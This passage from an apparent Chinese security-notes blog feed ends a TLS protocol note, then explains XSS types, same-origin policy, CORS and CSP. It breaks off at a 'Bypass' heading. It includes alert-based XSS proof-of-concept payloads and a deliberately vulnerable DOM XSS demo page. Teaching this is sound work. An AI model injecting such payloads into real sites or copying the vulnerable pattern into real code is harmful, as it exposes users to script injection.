发送，代表自己生成了新的密钥，通知对方以后将更换密钥，使用新的密钥进行通信。</p>\n<h2 id=\"encrypted-handshake-message\"><a class=\"anchor\" href=\"#encrypted-handshake-message\">#</a> Encrypted Handshake Message</h2>\n<p>客户端或者服务端发送，紧跟着 Key Exchange 发送。进行测试，一方用自己的刚刚生成的密钥加密一段固定的消息发送给对方，如果密钥协商正确无误的话，对方可以正确解密。</p>\n<h2 id=\"new-session-ticket\"><a class=\"anchor\" href=\"#new-session-ticket\">#</a> New Session Ticket</h2>\n<p>服务端发送，表示发起会话，在一段时间之内 (超时时间到来之前)，双方都以刚刚交换的密钥进行通信。从这以后，加密通信正式开始。</p>\n<h2 id=\"application-data\"><a class=\"anchor\" href=\"#application-data\">#</a> Application Data</h2>\n<p>使用密钥交换协议协商出来的密钥加密的应用层的数据。</p>\n<h2 id=\"encrypted-alert\"><a class=\"anchor\" href=\"#encrypted-alert\">#</a> Encrypted Alert</h2>\n<p>客户端或服务端发送，意味着加密通信因为某些原因需要中断，警告对方不要再发送敏感的数据。</p>\n<h1 id=\"版本更新内容\"><a class=\"anchor\" href=\"#版本更新内容\">#</a> 版本更新内容</h1>\n<h2 id=\"tls-13\"><a class=\"anchor\" href=\"#tls-13\">#</a> TLS 1.3</h2>\n<ul>\n<li>\n<p>引入了 PSK 作为新的密钥协商机制</p>\n</li>\n<li>\n<p>支持 0-RTT 模式，以安全性降低为代价，在建立连接时节省了往返时间</p>\n</li>\n<li>\n<p>ServerHello 之后的所有握手消息采取了加密操作，可见明文减少</p>\n</li>\n<li>\n<p>不再允许对加密报文进行压缩、不再允许双方发起重协商</p>\n</li>\n<li>\n<p>DSA 证书不再允许在 TLS 1.3 中使用</p>\n</li>\n<li>\n<p>删除不安全的密码算法</p>\n<ul>\n<li>RSA 密钥传输 - 不支持前向安全性</li>\n<li>CBC 模式密码 - 易受 BEAST 和 Lucky 13 攻击</li>\n<li>RC4 流密码 - 在 HTTPS 中使用并不安全</li>\n<li>SHA-1 哈希函数 - 建议以 SHA-2 取而代之</li>\n<li>任意 Diffie-Hellman 组 - CVE-2016-0701 漏洞</li>\n<li>输出密码 - 易受 FREAK 和 LogJam 攻击</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"子协议\"><a class=\"anchor\" href=\"#子协议\">#</a> 子协议</h1>\n<p>SSL/TLS 协议有一个高度模块化的架构，分为很多子协议，主要是：</p>\n<ul>\n<li>\n<p>Handshake 协议</p>\n<ul>\n<li>包括协商安全参数和密码套件、服务端身份认证 (客户端身份认证可选)、密钥交换</li>\n</ul>\n</li>\n<li>\n<p>ChangeCipherSpec 协议</p>\n<ul>\n<li>一条消息表明握手协议已经完成</li>\n</ul>\n</li>\n<li>\n<p>Alert 协议</p>\n<ul>\n<li>对握手协议中一些异常的错误提醒，分为 fatal 和 warning 两个级别，fatal 类型的错误会直接中断 SSL 链接，而 warning 级别的错误 SSL 链接仍可继续，只是会给出错误警告</li>\n</ul>\n</li>\n<li>\n<p>Record 协议</p>\n<ul>\n<li>包括对消息的分段、压缩、消息认证和完整性保护、加密等</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<h2 id=\"rfc\"><a class=\"anchor\" href=\"#rfc\">#</a> RFC</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzIyNDY=\">RFC 2246 The TLS Protocol Version 1.0</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzQzNDY=\">RFC 4346 The Transport Layer Security (TLS) Protocol Version 1.1</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzUyNDY=\">RFC 5246 The Transport Layer Security (TLS) Protocol Version 1.2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzYxMDE=\">RFC 6101 The Secure Sockets Layer (SSL) Protocol Version 3.0</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzYxNzY=\">RFC 6176 Prohibiting Secure Sockets Layer (SSL) Version 2.0</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzc1Njg=\">RFC 7568 Deprecating Secure Sockets Layer Version 3.0</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzg0NDY=\">RFC 8446 The Transport Layer Security (TLS) Protocol Version 1.3</span></li>\n</ul>\n<h2 id=\"document\"><a class=\"anchor\" href=\"#document\">#</a> Document</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvVHJhbnNwb3J0X0xheWVyX1NlY3VyaXR5\">Wikipedia Transport Layer Security</span></li>\n</ul>\n",
            "tags": [
                "计算机网络",
                "SSL",
                "TLS"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/XSS/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/XSS/",
            "title": "XSS",
            "date_published": "2022-11-26T03:55:09.000Z",
            "content_html": "<h1 id=\"分类\"><a class=\"anchor\" href=\"#分类\">#</a> 分类</h1>\n<h2 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h2>\n<p>XSS 全称为 Cross Site Scripting，为了和 CSS 分开简写为 XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了不在预期过程中的 JavaScript 代码执行。XSS 通常被用于获取 Cookie、以受攻击者的身份进行操作等行为。</p>\n<h2 id=\"反射型xss\"><a class=\"anchor\" href=\"#反射型xss\">#</a> 反射型 XSS</h2>\n<p>反射型 XSS 是比较常见和广泛的一类，举例来说，当一个网站的代码中包含类似下面的语句： <code>&lt;?php echo &quot;&lt;p&gt;hello, $_GET['user']&lt;/p&gt;&quot;;?&gt;</code>  ，那么在访问时设置  <code>/?user=&lt;/p&gt;&lt;script&gt;alert(&quot;hack&quot;)&lt;/script&gt;&lt;p&gt;</code>  ，则可执行预设好的 JavaScript 代码。</p>\n<p>反射型 XSS 通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发，且受到 XSS Auditor、NoScript 等防御手段的影响较大。</p>\n<h2 id=\"储存型xss\"><a class=\"anchor\" href=\"#储存型xss\">#</a> 储存型 XSS</h2>\n<p>储存型 XSS 相比反射型来说危害较大，在这种漏洞中，攻击者能够把攻击载荷存入服务器的数据库中，造成持久化的攻击。</p>\n<h2 id=\"dom-xss\"><a class=\"anchor\" href=\"#dom-xss\">#</a> DOM XSS</h2>\n<p>DOM 型 XSS 不同之处在于 DOM 型 XSS 一般和服务器的解析响应没有直接关系，而是在 JavaScript 脚本动态执行的过程中产生的。</p>\n<p>例如</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>DOM Based XSS Demo<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">xsstest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">var</span> str <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"input\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"output\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>innerHTML <span class=\"token operator\">=</span> <span class=\"token string\">\"&lt;img src='\"</span><span class=\"token operator\">+</span>str<span class=\"token operator\">+</span><span class=\"token string\">\"'>&lt;/img>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>output<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>input<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">size</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>50</span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>button<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token special-attr\"><span class=\"token attr-name\">onclick</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value javascript language-javascript\"><span class=\"token function\">xsstest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">\"</span></span></span> <span class=\"token punctuation\">/></span></span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>输入  <code>x' onerror='javascript:alert(/xss/)</code>  即可触发。</p>\n<h2 id=\"blind-xss\"><a class=\"anchor\" href=\"#blind-xss\">#</a> Blind XSS</h2>\n<p>Blind XSS 是储存型 XSS 的一种，它保存在某些存储中，当一个 “受害者” 访问这个页面时执行，并且在文档对象模型 (DOM) 中呈现 payload。 它被称为 Blind 的原因是因为它通常发生在通常不暴露给用户的功能上。</p>\n<h1 id=\"危害\"><a class=\"anchor\" href=\"#危害\">#</a> 危害</h1>\n<p>存在 XSS 漏洞时，可能会导致以下几种情况：</p>\n<ol>\n<li>用户的 Cookie 被获取，其中可能存在 Session ID 等敏感信息。若服务器端没有做相应防护，攻击者可用对应 Cookie 登陆服务器。</li>\n<li>攻击者能够在一定限度内记录用户的键盘输入。</li>\n<li>攻击者通过 CSRF 等方式以用户身份执行危险操作。</li>\n<li>XSS 蠕虫。</li>\n<li>获取用户浏览器信息。</li>\n<li>利用 XSS 漏洞扫描用户内网。</li>\n</ol>\n<h1 id=\"同源策略\"><a class=\"anchor\" href=\"#同源策略\">#</a> 同源策略</h1>\n<h2 id=\"简介-2\"><a class=\"anchor\" href=\"#简介-2\">#</a> 简介</h2>\n<p>同源策略限制了不同源之间如何进行资源交互，是用于隔离潜在恶意文件的重要安全机制。 是否同源由 URL 决定，URL 由协议、域名、端口和路径组成，如果两个 URL 的协议、域名和端口相同，则表示他们同源。</p>\n<h3 id=\"file域的同源策略\"><a class=\"anchor\" href=\"#file域的同源策略\">#</a> file 域的同源策略</h3>\n<p>在之前的浏览器中，任意两个 file 域的 URI 被认为是同源的。本地磁盘上的任何 HTML 文件都可以读取本地磁盘上的任何其他文件。</p>\n<p>从 Gecko 1.9 开始，文件使用了更细致的同源策略，只有当源文件的父目录是目标文件的祖先目录时，文件才能读取另一个文件。</p>\n<h3 id=\"cookie的同源策略\"><a class=\"anchor\" href=\"#cookie的同源策略\">#</a> cookie 的同源策略</h3>\n<p>cookie 使用不同的源定义方式，一个页面可以为本域和任何父域设置 cookie，只要是父域不是公共后缀 (public suffix) 即可。</p>\n<p>不管使用哪个协议 (HTTP/HTTPS) 或端口号，浏览器都允许给定的域以及其任何子域名访问 cookie。设置 cookie 时，可以使用  <code>domain</code>  /  <code>path</code>  /  <code>secure</code>  和  <code>http-only</code>  标记来限定其访问性。</p>\n<p>所以  <code>https://localhost:8080/</code>  和  <code>http://localhost:8081/</code>  的 Cookie 是共享的。</p>\n<h3 id=\"flashsilverlight跨域\"><a class=\"anchor\" href=\"#flashsilverlight跨域\">#</a> Flash/SilverLight 跨域</h3>\n<p>浏览器的各种插件也存在跨域需求。通常是通过在服务器配置 crossdomain.xml，设置本服务允许哪些域名的跨域访问。</p>\n<p>客户端会请求此文件，如果发现自己的域名在访问列表里，就发起真正的请求，否则不发送请求。</p>\n<h2 id=\"源的更改\"><a class=\"anchor\" href=\"#源的更改\">#</a> 源的更改</h2>\n<p>同源策略认为域和子域属于不同的域，例如  <code>child1.a.com</code>  与  <code>a.com</code>  /  <code>child1.a.com</code>  与  <code>child2.a.com</code>  /  <code>xxx.child1.a.com</code>  与  <code>child1.a.com</code>  两两不同源。</p>\n<p>对于这种情况，可以在两个方面各自设置  <code>document.domain='a.com'</code>  来改变其源来实现以上任意两个页面之间的通信。</p>\n<p>另外因为浏览器单独保存端口号，这种赋值会导致端口号被重写为  <code>null</code>  。</p>\n<h2 id=\"跨源访问\"><a class=\"anchor\" href=\"#跨源访问\">#</a> 跨源访问</h2>\n<p>同源策略控制了不同源之间的交互，这些交互通常分为三类：</p>\n<ul>\n<li>通常允许跨域写操作 (Cross-origin writes)\n<ul>\n<li>链接 (links)</li>\n<li>重定向</li>\n<li>表单提交</li>\n</ul>\n</li>\n<li>通常允许跨域资源嵌入 (Cross-origin embedding)</li>\n<li>通常不允许跨域读操作 (Cross-origin reads)</li>\n</ul>\n<p>可能嵌入跨源的资源的一些示例有：</p>\n<ul>\n<li><code>&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;</code>  标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。</li>\n<li><code>&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;</code>  标签嵌入 CSS。由于 CSS 的松散的语法规则，CSS 的跨域需要一个设置正确的 Content-Type 消息头。</li>\n<li><code>&lt;img&gt;</code>  /  <code>&lt;video&gt;</code>  /  <code>&lt;audio&gt;</code>  嵌入多媒体资源。</li>\n<li><code>&lt;object&gt;</code>   <code>&lt;embed&gt;</code>  和  <code>&lt;applet&gt;</code>  的插件。</li>\n<li><code>@font-face</code>  引入的字体。一些浏览器允许跨域字体 (cross-origin fonts)，一些需要同源字体 (same-origin fonts)。</li>\n<li><code>&lt;frame&gt;</code>  和  <code>&lt;iframe&gt;</code>  载入的任何资源。站点可以使用 X-Frame-Options 消息头来阻止这种形式的跨域交互。</li>\n</ul>\n<h3 id=\"jsonp跨域\"><a class=\"anchor\" href=\"#jsonp跨域\">#</a> JSONP 跨域</h3>\n<p>JSONP 就是利用  <code>&lt;script&gt;</code>  标签的跨域能力实现跨域数据的访问，请求动态生成的 JavaScript 脚本同时带一个 callback 函数名作为参数。</p>\n<p>服务端收到请求后，动态生成脚本产生数据，并在代码中以产生的数据为参数调用 callback 函数。</p>\n<p>JSONP 也存在一些安全问题，例如当对传入 / 传回参数没有做校验就直接执行返回的时候，会造成 XSS 问题。没有做 Referer 或 Token 校验就给出数据的时候，可能会造成数据泄露。</p>\n<p>另外 JSONP 在没有设置 callback 函数的白名单情况下，可以合法的做一些设计之外的函数调用，引入问题。这种攻击也被称为 SOME 攻击。</p>\n<h3 id=\"跨源脚本api访问\"><a class=\"anchor\" href=\"#跨源脚本api访问\">#</a> 跨源脚本 API 访问</h3>\n<p>Javascript 的 APIs 中，如  <code>iframe.contentWindow</code>  ,  <code>window.parent</code> ,  <code>window.open</code>  和  <code>window.opener</code>  允许文档间相互引用。当两个文档的源不同时，这些引用方式将对  <code>window</code>  和  <code>location</code>  对象的访问添加限制。</p>\n<p><code>window</code>  允许跨源访问的方法有</p>\n<ul>\n<li>window.blur</li>\n<li>window.close</li>\n<li>window.focus</li>\n<li>window.postMessage</li>\n</ul>\n<p><code>window</code>  允许跨源访问的属性有</p>\n<ul>\n<li>window.closed</li>\n<li>window.frames</li>\n<li>window.length</li>\n<li>window.location</li>\n<li>window.opener</li>\n<li>window.parent</li>\n<li>window.self</li>\n<li>window.top</li>\n<li>window.window</li>\n</ul>\n<p>其中  <code>window.location</code>  允许读 / 写，其他的属性只允许读</p>\n<h3 id=\"跨源数据存储访问\"><a class=\"anchor\" href=\"#跨源数据存储访问\">#</a> 跨源数据存储访问</h3>\n<p>存储在浏览器中的数据，如  <code>localStorage</code>  和  <code>IndexedDB</code> ，以源进行分割。每个源都拥有自己单独的存储空间，一个源中的 Javascript 脚本不能对属于其它源的数据进行读写操作。</p>\n<h2 id=\"cors\"><a class=\"anchor\" href=\"#cors\">#</a> CORS</h2>\n<p>CORS 是一个 W3C 标准，全称是跨域资源共享 (Cross-origin resource sharing)。通过这个标准，可以允许浏览器读取跨域的资源。</p>\n<h3 id=\"常见请求头\"><a class=\"anchor\" href=\"#常见请求头\">#</a> 常见请求头</h3>\n<ul>\n<li>Origin\n<ul>\n<li>预检请求或实际请求的源站 URI, 浏览器请求默认会发送该字段</li>\n<li><code>Origin: &lt;origin&gt;</code></li>\n</ul>\n</li>\n<li>Access-Control-Request-Method\n<ul>\n<li>声明请求使用的方法</li>\n<li><code>Access-Control-Request-Method: &lt;method&gt;</code></li>\n</ul>\n</li>\n<li>Access-Control-Request-Headers\n<ul>\n<li>声明请求使用的 header 字段</li>\n<li><code>Access-Control-Request-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]*</code></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"常见返回头\"><a class=\"anchor\" href=\"#常见返回头\">#</a> 常见返回头</h3>\n<ul>\n<li>Access-Control-Allow-Origin\n<ul>\n<li>声明允许访问的源外域 URI</li>\n<li>对于携带身份凭证的请求不可使用通配符</li>\n<li><code>*``Access-Control-Allow-Origin: &lt;origin&gt; | *</code></li>\n</ul>\n</li>\n<li>Access-Control-Expose-Headers\n<ul>\n<li>声明允许暴露的头</li>\n<li>e.g.  <code>Access-Control-Expose-Headers: X-My-Custom-Header, X-Another-Custom-Header</code></li>\n</ul>\n</li>\n<li>Access-Control-Max-Age\n<ul>\n<li>声明 Cache 时间</li>\n<li><code>Access-Control-Max-Age: &lt;delta-seconds&gt;</code></li>\n</ul>\n</li>\n<li>Access-Control-Allow-Credentials\n<ul>\n<li>声明是否允许在请求中带入</li>\n<li><code>Access-Control-Allow-Credentials: true</code></li>\n</ul>\n</li>\n<li>Access-Control-Allow-Methods\n<ul>\n<li>声明允许的访问方式</li>\n<li><code>Access-Control-Allow-Methods: &lt;method&gt;[, &lt;method&gt;]*</code></li>\n</ul>\n</li>\n<li>Access-Control-Allow-Headers\n<ul>\n<li>声明允许的头</li>\n<li><code>Access-Control-Allow-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]*</code></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"防御建议\"><a class=\"anchor\" href=\"#防御建议\">#</a> 防御建议</h3>\n<ul>\n<li>如非必要不开启 CORS</li>\n<li>定义详细的白名单，不使用通配符，仅配置所需要的头</li>\n<li>配置  <code>Vary: Origin</code>  头部</li>\n<li>如非必要不使用  <code>Access-Control-Allow-Credentials</code></li>\n<li>限制缓存的时间</li>\n</ul>\n<h2 id=\"阻止跨源访问\"><a class=\"anchor\" href=\"#阻止跨源访问\">#</a> 阻止跨源访问</h2>\n<p>阻止跨域写操作，可以检测请求中的  <code>CSRF token</code>  ，这个标记被称为 Cross-Site Request Forgery (CSRF) 标记。</p>\n<p>阻止资源的跨站读取，因为嵌入资源通常会暴露信息，需要保证资源是不可嵌入的。但是多数情况下浏览器都不会遵守  <code>Content-Type</code>  消息头。例如如果在 HTML 文档中指定  <code>&lt;script&gt;</code>  标记，则浏览器会尝试将 HTML 解析为 JavaScript。</p>\n<h1 id=\"csp\"><a class=\"anchor\" href=\"#csp\">#</a> CSP</h1>\n<h2 id=\"csp是什么\"><a class=\"anchor\" href=\"#csp是什么\">#</a> CSP 是什么？</h2>\n<p>Content Security Policy，简称 CSP，译作内容安全策略。顾名思义，这个规范与内容安全有关，主要是用来定义哪些资源可以被当前页面加载，减少 XSS 的发生。</p>\n<h2 id=\"配置\"><a class=\"anchor\" href=\"#配置\">#</a> 配置</h2>\n<p>CSP 策略可以通过 HTTP 头信息或者 meta 元素定义。</p>\n<p>CSP 有三类：</p>\n<ul>\n<li>Content-Security-Policy (Google Chrome)</li>\n<li>X-Content-Security-Policy (Firefox)</li>\n<li>X-WebKit-CSP (WebKit-based browsers, e.g. Safari)</li>\n</ul>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>HTTP header :</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\"Content-Security-Policy:\" 策略</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\"Content-Security-Policy-Report-Only:\" 策略</pre></td></tr></table></figure><p>HTTP Content-Security-Policy 头可以指定一个或多个资源是安全的，而 Content-Security-Policy-Report-Only 则是允许服务器检查（非强制）一个策略。多个头的策略定义由优先采用最先定义的。</p>\n<p>HTML Meta :</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>content-security-policy<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>策略<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>content-security-policy-report-only<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>策略<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h3 id=\"指令说明\"><a class=\"anchor\" href=\"#指令说明\">#</a> 指令说明</h3>\n<table>\n<thead>\n<tr>\n<th>指令</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>default-src</td>\n<td>定义资源默认加载策略</td>\n</tr>\n<tr>\n<td>connect-src</td>\n<td>定义 Ajax、WebSocket 等加载策略</td>\n</tr>\n<tr>\n<td>font-src</td>\n<td>定义 Font 加载策略</td>\n</tr>\n<tr>\n<td>frame-src</td>\n<td>定义 Frame 加载策略</td>\n</tr>\n<tr>\n<td>img-src</td>\n<td>定义图片加载策略</td>\n</tr>\n<tr>\n<td>media-src</td>\n<td>定义 &lt;audio&gt;、&lt;video&gt; 等引用资源加载策略</td>\n</tr>\n<tr>\n<td>object-src</td>\n<td>定义 &lt;applet&gt;、&lt;embed&gt;、&lt;object&gt; 等引用资源加载策略</td>\n</tr>\n<tr>\n<td>script-src</td>\n<td>定义 JS 加载策略</td>\n</tr>\n<tr>\n<td>style-src</td>\n<td>定义 CSS 加载策略</td>\n</tr>\n<tr>\n<td>base-uri</td>\n<td>定义 &lt;base&gt; 根 URL 策略，不使用 default-src 作为默认值</td>\n</tr>\n<tr>\n<td>sandbox</td>\n<td>值为 allow-forms，对资源启用 sandbox</td>\n</tr>\n<tr>\n<td>report-uri</td>\n<td>值为 /report-uri，提交日志</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"关键字\"><a class=\"anchor\" href=\"#关键字\">#</a> 关键字</h3>\n<ul>\n<li><code>-</code>\n<ul>\n<li>允许从任意 url 加载，除了  <code>data:</code>   <code>blob:</code>   <code>filesystem:</code>   <code>schemes</code></li>\n<li>e.g.  <code>img-src -</code></li>\n</ul>\n</li>\n<li><code>none</code>\n<ul>\n<li>禁止从任何 url 加载资源</li>\n<li>e.g.  <code>object-src 'none'</code></li>\n</ul>\n</li>\n<li><code>self</code>\n<ul>\n<li>只可以加载同源资源</li>\n<li>e.g.  <code>img-src 'self'</code></li>\n</ul>\n</li>\n<li><code>data:</code>\n<ul>\n<li>可以通过 data 协议加载资源</li>\n<li>e.g.  <code>img-src 'self' data:</code></li>\n</ul>\n</li>\n<li><code>domain.example.com</code>\n<ul>\n<li>e.g.  <code>img-src domain.example.com</code></li>\n<li>只可以从特定的域加载资源</li>\n</ul>\n</li>\n<li><code>\\*.example.com</code>\n<ul>\n<li>e.g.  <code>img-src \\*.example.com</code></li>\n<li>可以从任意 example.com 的子域处加载资源</li>\n</ul>\n</li>\n<li><code>https://cdn.com</code>\n<ul>\n<li>e.g.  <code>img-src https://cdn.com</code></li>\n<li>只能从给定的域用 https 加载资源</li>\n</ul>\n</li>\n<li><code>https:</code>\n<ul>\n<li>e.g.  <code>img-src https:</code></li>\n<li>只能从任意域用 https 加载资源</li>\n</ul>\n</li>\n<li><code>unsafe-inline</code>\n<ul>\n<li>允许内部资源执行代码例如 style attribute,onclick 或者是 sicript 标签</li>\n<li>e.g.  <code>script-src 'unsafe-inline'</code></li>\n</ul>\n</li>\n<li><code>unsafe-eval</code>\n<ul>\n<li>允许一些不安全的代码执行方式，例如 js 的 eval ()</li>\n<li>e.g.  <code>script-src 'unsafe-eval'</code></li>\n</ul>\n</li>\n<li><code>nonce-&lt;base64-value&gt;'</code>\n<ul>\n<li>使用随机的 nonce，允许加载标签上 nonce 属性匹配的标签</li>\n<li>e.g.  <code>script-src 'nonce-bm9uY2U='</code></li>\n</ul>\n</li>\n<li><code>&lt;hash-algo&gt;-&lt;base64-value&gt;'</code>\n<ul>\n<li>允许 hash 值匹配的代码块被执行</li>\n<li>e.g.  <code>script-src 'sha256-&lt;base64-value&gt;'</code></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"配置范例\"><a class=\"anchor\" href=\"#配置范例\">#</a> 配置范例</h3>\n<p>允许执行内联 JS 代码，但不允许加载外部资源</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>Content<span class=\"token operator\">-</span>Security<span class=\"token operator\">-</span>Policy<span class=\"token operator\">:</span> <span class=\"token keyword\">default</span><span class=\"token operator\">-</span>src <span class=\"token string\">'self'</span><span class=\"token punctuation\">;</span> script<span class=\"token operator\">-</span>src <span class=\"token string\">'self'</span> <span class=\"token string\">'unsafe-inline'</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"bypass\"><a class=\"anchor\" href=\"#bypass\">#</a> Bypass</h2>\n<h3 id=\"预加载\"><a class=\"anchor\" href=\"#预加载\">#</a> 